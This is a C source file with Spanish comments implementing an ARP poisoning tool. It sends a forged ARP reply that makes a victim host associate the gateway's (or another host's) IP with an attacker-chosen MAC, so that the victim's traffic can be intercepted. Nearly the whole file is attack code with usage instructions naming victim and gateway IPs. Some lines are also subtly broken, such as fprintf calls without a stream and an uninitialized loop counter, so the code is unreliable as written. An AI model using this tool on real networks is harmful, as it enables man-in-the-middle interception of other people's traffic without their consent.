/*

/** Lanzar un ARP REPLY al host víctima con la MAC origen del host que quiera recibir las tramas la intención es que se falsee la ip de la puerta de enlace de la red -si se quiere recibir tráfico destinado a una red externa-, o la ip de un equipo de la red local -si se quiere recibir el tráfico destinado a ese host-
La ip destino será la ip del host a "engañar", al recibir el reply, asociará en su tabla arp una entrada falsa e.g. el par IPGATEWAY-MIMAC -todo tráfico dirigido al router (normalmente todo lo destinado a redes externas salvo cambios en la tabla de encaminamiento) es interceptado- **/
     
    #include <errno.h>
    #include <stdio.h>
    #include <stdarg.h>
    #include <string.h>
    #include <arpa/inet.h>
    #include <net/ethernet.h>
    #include <net/if.h>
    #include <netinet/if_ether.h>
    #include <netpacket/packet.h>
    #include <sys/ioctl.h>
    #include <sys/socket.h>
     
    int get_socket_descriptor();
    int get_iface_index(int);
    void set_sockaddr_ll(struct sockaddr_ll*,int);
    void send_eth_frame(struct ether_arp*,struct in_addr*,struct sockaddr_ll*,int,const char*,const char*);
    void usage();
     
    /** MAC ADDR de difusión -> 48 bits a 1 **/
    const unsigned char ether_broadcast_addr[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    /** Spoofed MAC por defecto **/
    unsigned char ether_spoofed_addr[] = {0x13,0x37,0x13,0x37,0x13,0x37};
     
    int main(int argc,char** argv[]){
            if(argc!=4){
                     usage();
                     exit(0);
            }
         /** Set MAC arg **/
         char* p = argv[3];
         int i,j = 0;
         for(;i<=15;i+=3) sscanf(p+i,"%2x",&ether_spoofed_addr[j++]);
            
            /** Obtener descriptor del socket **/
            int fd = get_socket_descriptor();
            /** Obtener indice de la interfaz que se quiere emplear para el envío **/
            int if_index = get_iface_index(fd);
            /** Set del AF_PACKET **/
            struct sockaddr_ll addr;
            memset(&addr,0,sizeof(struct sockaddr_ll));
            set_sockaddr_ll(&addr,if_index);
            /** Envío de la trama ethernet **/
            struct ether_arp req;
            struct in_addr target_ip_addr;
            memset(&req,0,sizeof(struct ether_arp));
            memset(&target_ip_addr,0,sizeof(struct in_addr));
            send_eth_frame(&req,&target_ip_addr,&addr,fd,argv[2],argv[1]);
            return 0;
    }
     
    void send_eth_frame(struct ether_arp* req,struct in_addr* target_ip_addr,struct sockaddr_ll* addr, int fd,const char* target_ip_string,const char* source_ip_string){
            req->arp_hrd = htons(ARPHRD_ETHER);
            req->arp_op = htons(ARPOP_REPLY); // ARPOP_REQUEST || ARPOP_REPLY
            req->arp_pro = htons(ETH_P_IP);   
            req->arp_hln = ETHER_ADDR_LEN;   
            req->arp_pln = sizeof(in_addr_t);
           
           /** Set MAC origen (source hardware address) **/
            memset(&(req->arp_sha),0,sizeof(req->arp_sha));
            memcpy(&(req->arp_sha),ether_spoofed_addr,sizeof(req->arp_sha));
           
         /** Falsear IP origen (source protocol address) **/
         if(!inet_aton(source_ip_string,target_ip_addr)){
                    fprintf("%s no es una ip valida",target_ip_string);
                    exit(0);
            }
            memset(&(req->arp_spa),0,sizeof(req->arp_spa));
            memcpy(&req->arp_spa,&target_ip_addr->s_addr,sizeof(req->arp_spa));
           
            /** Set req->arp_tpa (target protocol address) ip víctima **/
            if(!inet_aton(target_ip_string,target_ip_addr)){
                    fprintf("%s no es una ip valida",target_ip_string);
                    exit(0);
            }
            memset(&(req->arp_tpa),0,sizeof(req->arp_tpa));
            memcpy(&req->arp_tpa,&target_ip_addr->s_addr,sizeof(req->arp_tpa));

            /** Send packet **/
            if(sendto(fd,req,sizeof(*req),0,(struct sockaddr*)addr,sizeof(*addr))==-1){
                    fprintf(stderr,"%s",strerror(errno));
            }
            else fprintf(stdout,"ARP Poisoning realizado\n");
    }
     
    void set_sockaddr_ll(struct sockaddr_ll* addr,int if_index){
            addr->sll_family = AF_PACKET;
            addr->sll_ifindex = if_index;
            // MAC -> 6B -> 48b -> 2^48 combinaciones , 24 MSB compañia, 24 LBS id
            addr->sll_halen = sizeof(ether_broadcast_addr);
            addr->sll_protocol = htons(ETH_P_ARP); // 0x806 ARP,0x800IP,...
            memcpy(addr->sll_addr,ether_broadcast_addr,sizeof(ether_broadcast_addr));
    }
     
    int get_socket_descriptor(){
            int fd = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
            if(fd==-1){
                    fprintf(stderr,"%s",strerror(errno));
                    exit(0);
            }
            return fd;
    }
     
    int get_iface_index(int fd){
            struct ifreq ifr;
            char* if_name = "eth0";
            size_t if_name_len = strlen(if_name);
            /** Comprobar si cabe en ifr_name[IFNAMSIZ]; **/
            if(if_name_len<IFNAMSIZ){
                    /** Especificar el nombre de la interfaz **/
                    memcpy(ifr.ifr_name,if_name,if_name_len);
                    ifr.ifr_name[if_name_len] = 0x00; // NULL byte at end
            }else{
                    fprintf(stderr,"Nombre de interfaz demasiado largo");
                    exit(0);
            }
            /** Consultar al driver de la NIC el index de la interfaz ifr con
                    request SIOCGIFINDEX **/
            if(ioctl(fd,SIOCGIFINDEX,&ifr)==-1){
                    fprintf(stderr,"%s",strerror(errno));
                    exit(0);
            }
            return ifr.ifr_ifindex;
    }
     
    void usage(){
            fprintf(stdout,"usage: ./arppoisoning sourceIP destinationIP spoofedMAC\n\tsourceIP: Ip para spoofear la dirección origen(e.g 192.168.1.1 (GW))\n\tdestinationIP: Ip destino del host cuya tabla debe ser envenenada (e.g. 192.168.1.134).\n\tspoofedMAC: Mac del host que recibirá las tramas(e.g. FF-FF-FF-FF-FF-FF).\n");
    }
